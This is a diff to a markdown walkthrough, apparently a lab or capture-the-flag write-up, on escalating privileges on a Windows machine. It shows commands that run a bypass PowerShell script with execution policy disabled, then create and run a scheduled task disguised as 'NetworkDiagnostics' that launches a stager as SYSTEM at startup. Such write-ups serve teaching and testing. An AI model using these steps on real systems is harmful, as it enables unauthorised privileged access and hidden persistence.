@@ -263,16 +263,16 @@ Then we execute the file
 execute powershell.exe -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; & 'C:\Users\garfield\Desktop\bypass.ps1'"
 ```
 ![Executing bypass file](assets/execute-bypass.png)
-You should see a new session appear, this one with a higher integrity.
+You should see a new session appear, this one with a higher integrity. Interact with the new session (sessions -i <number>). From the higher integrity session we can schedule a task.
 
 ```
 execute -o schtasks /create /tn "NetworkDiagnostics" /tr "C:\Users\garfield\Desktop\stager.exe" /sc onstart /ru "NT AUTHORITY\SYSTEM" /f
 ```
+And then we can execute it.
 
 ```
 execute -o schtasks /run /tn "NetworkDiagnostics"
 ```
-### Creating an evil service on Garfield's machine
 
 
 
